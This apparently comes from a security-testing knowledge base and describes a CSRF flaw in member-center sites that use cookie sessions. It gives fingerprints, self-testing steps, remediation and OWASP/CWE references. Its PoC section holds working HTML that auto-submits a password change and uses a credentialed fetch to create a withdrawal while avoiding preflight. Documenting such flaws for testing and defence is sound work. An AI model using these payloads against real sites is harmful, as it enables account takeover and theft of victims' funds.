---
title: CSRF (tokenless withdrawals/password changes/card linking)
cve: None (implementation flaw)
severity: high
cvss: 8.0
product: Custom member center (Cookie sessions)
versions: Any
ports: 80, 443
keywords: csrf, cross-site, withdrawals, password changes, card linking, token
entry: Critical operations lack CSRF tokens and SameSite is unset
verified: false
sources: Compiled from public sources (implementation flaws)
---

## Fingerprints

- Critical requests (withdrawals/password changes/card linking) use only Cookie, with no `csrf`/`token` parameter;
- Response `Set-Cookie` lacks `SameSite`.

## Prerequisites

- The victim is logged in to the target site; the attacker can induce them to visit a page.

## PoC

```html
<!-- Attacker page: automatically submit a password change -->
<form id="f" action="https://target/api/user/updatePwd" method="POST"
      enctype="application/x-www-form-urlencoded">
  <input name="newPwd" value="Passw0rd!2026">
  <input name="uid" value="1001">
</form>
<script>document.getElementById('f').submit()</script>
```

```html
<!-- Or, for a JSON endpoint: use fetch + text/plain to bypass preflight -->
<script>
fetch('https://target/api/withdraw/apply', {
  method:'POST', credentials:'include',
  headers:{'Content-Type':'text/plain'},
  body:JSON.stringify({amount:100, bankId:9})
})
</script>
```

```bash
# Result: open the page while logged in with your own account; account changed/withdrawal order created = confirmed
```

## Exploitation Steps

1. First confirm the absence of a token and SameSite;
2. Serve a page locally for self-testing (your own account);
3. After success, assess the operation's impact (password change/withdrawal/card linking);
4. Evidence: captured request + server-side state change.

## Remediation and Mitigation

- Add a CSRF token (single use) + `SameSite=Lax/Strict` for critical operations; validate Origin/Referer.

## References

- OWASP CSRF Prevention; CWE-352.
